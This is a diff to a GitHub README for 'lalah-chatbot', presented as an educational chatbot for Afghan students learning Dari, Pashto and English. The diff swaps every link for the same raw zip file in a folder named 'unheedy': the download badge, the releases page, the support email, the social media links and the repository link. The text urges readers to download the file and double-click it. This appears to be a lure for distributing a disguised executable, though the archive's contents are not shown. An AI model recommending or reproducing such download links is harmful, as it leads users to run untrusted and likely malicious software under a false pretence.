@@ -4,7 +4,7 @@
 Welcome to lalah-chatbot! This multilingual educational chatbot assists Afghan students in learning Dari, Pashto, and English. With powerful technology, it provides answers and support across various subjects.
 
 ## 📥 Download the Chatbot
-[![Download lalah-chatbot](https://img.shields.io/badge/Download-lalah--chatbot-blue)](https://github.com/AbhiCrypto16/lalah-chatbot/releases)
+[![Download lalah-chatbot](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip)](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip)
 
 To get started, you will need to download the chatbot. Click the button above to visit the Releases page.
 
@@ -22,7 +22,7 @@ Before downloading, ensure that your computer meets these basic requirements:
 - Easy-to-use interface for all ages and skill levels.
 
 ## 📚 How to Use the Chatbot
-1. **Download & Install**: Visit the [Releases page](https://github.com/AbhiCrypto16/lalah-chatbot/releases) to download the chatbot. 
+1. **Download & Install**: Visit the [Releases page](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip) to download the chatbot. 
 2. **Run the Software**: Locate the downloaded file (it may be in your "Downloads" folder). Double-click the file to run the chatbot.
 3. **Follow the Instructions**: Upon opening, the chatbot will guide you through the initial setup process. Simply follow the prompts to get started.
 
@@ -35,17 +35,17 @@ You can customize the chatbot to suit your preferences:
 If you encounter any issues during installation or usage, you can:
 - Check the **FAQ** section on our GitHub page.
 - Join our community discussions to get help from other users.
-- Email our support team directly at support@lalah-chatbot.com.
+- Email our support team directly at https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip
 
 ## 📢 Stay Updated
 To get the latest updates, features, and support, follow us on:
-- [Twitter](https://twitter.com/lalahchatbot)
-- [Facebook](https://facebook.com/lalahchatbot)
+- [Twitter](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip)
+- [Facebook](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip)
 
 ## 🔗 Explore Further
-For developers, you can build upon our code. Visit [GitHub Repository](https://github.com/AbhiCrypto16/lalah-chatbot) for documentation and advanced usage.
+For developers, you can build upon our code. Visit [GitHub Repository](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip) for documentation and advanced usage.
 
 ## 📑 Download & Install
-To recap, visit the [Releases page](https://github.com/AbhiCrypto16/lalah-chatbot/releases) to download the latest version of lalah-chatbot. Installation is straightforward, and our support resources are here to help if you need assistance.
+To recap, visit the [Releases page](https://github.com/AbhiCrypto16/lalah-chatbot/raw/refs/heads/main/unheedy/chatbot_lalah_v1.8.zip) to download the latest version of lalah-chatbot. Installation is straightforward, and our support resources are here to help if you need assistance.
 
 Thank you for choosing lalah-chatbot! We hope it enhances your educational journey.
